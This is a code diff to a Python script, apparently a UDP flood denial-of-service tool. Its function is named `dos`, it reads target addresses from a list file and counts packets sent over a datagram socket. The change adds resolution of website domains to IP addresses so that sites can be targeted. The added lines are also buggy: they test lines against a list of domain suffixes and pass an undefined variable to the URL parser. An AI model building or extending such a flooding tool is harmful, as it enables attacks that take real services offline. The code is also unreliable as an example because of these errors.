@@ -1,5 +1,6 @@
 from colorama import Fore
 import argparse
+from urllib.parse import urlparse
 import socket
 import time
 
@@ -10,9 +11,15 @@ argparser.add_argument("-t", "--timeout", type=float, help="Argumento opcional q
 args = argparser.parse_args()
 
 def dos(args):
+   net = [".com", ".net", ".me", ".org", ".blog", ".br", ".gov"]
    ips = []
    with open("lista.txt", "r") as file:
        for linha in file:
+           if linha in net:
+              url = urlparse(url)
+              neloc = f"{url.netloc}"
+              ip = socket.gethostbyname(neloc)
+              ips.append(ip)
            ips.append(linha.strip())
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    totalpack = 0
